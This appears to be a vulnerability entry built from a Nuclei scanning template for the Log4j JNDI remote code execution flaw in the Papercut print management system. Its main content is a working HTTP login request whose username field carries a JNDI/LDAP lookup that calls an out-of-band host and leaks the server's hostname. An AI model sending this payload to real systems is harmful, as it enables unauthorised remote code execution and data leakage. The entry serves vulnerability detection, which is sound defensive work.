# Vulnerability: Papercut - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`papercut-log4j-rce.yaml`)

## Description
Papercut is susceptible to Log4j JNDI remote code execution. Papercut is a print management system.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /app HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/app
Content-Type: application/x-www-form-urlencoded

service=direct%2F1%2FHome%2F%24Form&sp=S0&Form0=%24Hidden%240%2C%24Hidden%241%2CinputUsername%2CinputPassword%2C%24Submit%240%2C%24PropertySelection&%24Hidden%240=true&%24Hidden%241=X&inputUsername=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&inputPassword=a&%24Submit%240=Log+in&%24PropertySelection=en
```

